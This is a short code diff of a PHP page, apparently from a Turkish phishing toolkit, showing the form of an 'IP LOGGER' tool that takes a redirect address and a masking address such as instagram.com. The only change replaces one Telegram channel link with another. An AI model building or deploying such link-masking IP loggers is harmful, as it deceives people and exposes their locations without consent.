@@ -243,7 +243,7 @@ include ("../../phishing_files/info-box.php");
 ?>
 <br><img src="https://image.flaticon.com/icons/png/512/4021/4021314.png" width="100" height="100" style="background: #7cfc00; border-radius:50px;"><br><br>
   <h1 class="green-neon">İP LOGGER</h1>
-<p> Yönlendirelecek Adres = https://t.me/umutkaratools <br><br> Maskeleme Adresi = https://instagram.com</p>
+<p> Yönlendirelecek Adres = https://t.me/EmossDevTools <br><br> Maskeleme Adresi = https://instagram.com</p>
   <input type="url" name="url_1" placeholder="Yönlendirelecek Adres.." autocomplete="off" required>
   <input type="url" name="url_2" placeholder="Maskeleme Adresi.." autocomplete="off" required>
   <input type="submit" name="" value="Start">
